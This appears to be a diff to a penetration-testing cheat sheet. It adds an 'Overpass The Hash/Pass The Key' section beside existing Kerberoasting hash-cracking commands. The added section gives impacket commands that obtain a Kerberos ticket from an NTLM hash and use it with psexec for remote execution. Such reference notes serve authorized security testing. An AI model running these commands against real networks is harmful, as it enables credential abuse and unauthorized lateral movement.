@@ -121,6 +121,7 @@
     - [Kerberos brute force](#Kerberos-brute-force)
     - [ASREPRoast](#ASREPRoast)
     - [Kerberoasting](#Kerberoasting)
+    - [Overpass The Hash/Pass The Key](#Overpass-The-Hash/Pass-The-Key)
     - [Pass the key](Pass-the-key)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
@@ -1044,4 +1045,16 @@ hashcat -m 13100 --force -a 0 hashes.file rock_you.txt
 john --format=krb5tgs --wordlist=rock_you.txt hashes.file
 ```
 
+### Overpass The Hash/Pass The Key
+
+- Tool: https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py
+
+- Usage:
+```
+python getTGT.py domain.name/user_name -hashes :NTLM hash
+
+python psexec.py domain.name/user_name@<machine_ip> -k -no-pass
+```
+
 ### Pass the key
+
